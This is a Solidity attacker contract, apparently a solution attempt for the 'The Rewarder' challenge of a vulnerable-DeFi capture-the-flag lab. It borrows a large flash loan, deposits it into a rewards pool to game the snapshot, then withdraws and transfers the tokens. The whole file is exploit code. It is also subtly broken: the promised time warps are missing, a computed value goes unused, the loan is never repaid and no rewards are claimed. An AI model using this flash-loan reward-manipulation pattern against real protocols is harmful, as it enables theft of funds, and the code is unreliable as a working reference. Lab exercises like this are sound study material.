pragma solidity 0.8.17;

import {ReentrancyGuard} from "openzeppelin-contracts/security/ReentrancyGuard.sol";
import {Address} from "openzeppelin-contracts/utils/Address.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {FlashLoanerPool} from "./FlashLoanerPool.sol";

import "forge-std/Test.sol";

contract Receiver {
    address public immutable attacker;

    TheRewarderPool public immutable rewarderPool;
    DamnValuableToken public immutable liquidityToken;
    FlashLoanerPool public immutable flashLoanerPool;

    constructor(address rewarderPoolAddress, address liquidityTokenAddress, address flashLoanerPoolAddress) {
        rewarderPool = TheRewarderPool(rewarderPoolAddress);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        flashLoanerPool = FlashLoanerPool(flashLoanerPoolAddress);
        attacker = msg.sender;
    }

    // function attack() external {
    //     flashLoanerPool.flashLoan(1_000_000e18);
    // }
    function attack() external {
        // Get the time left for the current rewards round to end
        uint256 timeLeft = rewarderPool.lastRecordedSnapshotTimestamp() + 5 days - block.timestamp;

        // Warp the time to just before the rewards round ends

        // Take a flash loan and deposit the obtained tokens into the reward pool
        flashLoanerPool.flashLoan(1_000_000e18);

        // Warp the time to the start of the new rewards round

        rewarderPool.withdraw(1_000_000e18);
        liquidityToken.transfer(msg.sender, 1_000_000e18);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
    }
}
